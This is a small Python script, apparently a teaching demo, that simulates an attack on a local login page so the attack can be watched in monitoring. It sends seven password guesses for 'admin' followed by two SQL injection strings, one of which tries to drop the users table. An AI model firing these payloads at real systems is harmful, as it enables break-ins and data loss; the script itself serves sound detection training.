"""Simula un ataque contra la app LOCAL (solo para la demo, en tu propia maquina).

Uso:  python 5-monitoreo/simular_ataque.py
"""
import time
import urllib.error
import urllib.parse
import urllib.request

URL = "http://127.0.0.1:5000/login"
INTENTOS = [("admin", f"clave{i}") for i in range(1, 8)] + [
    ("' OR '1'='1' --", "x"),
    ("admin'; DROP TABLE users; --", "x"),
]


def main():
    print(f"Inicio del ataque: {time.strftime('%H:%M:%S')}")
    for usuario, clave in INTENTOS:
        datos = urllib.parse.urlencode({"usuario": usuario, "clave": clave}).encode()
        try:
            with urllib.request.urlopen(URL, datos, timeout=5) as r:  # nosec
                estado = r.status
        except urllib.error.HTTPError as e:
            estado = e.code
        print(f"  intento usuario={usuario!r:35} -> HTTP {estado}")
        time.sleep(0.4)
    print(f"Fin del ataque: {time.strftime('%H:%M:%S')}")


if __name__ == "__main__":
    main()
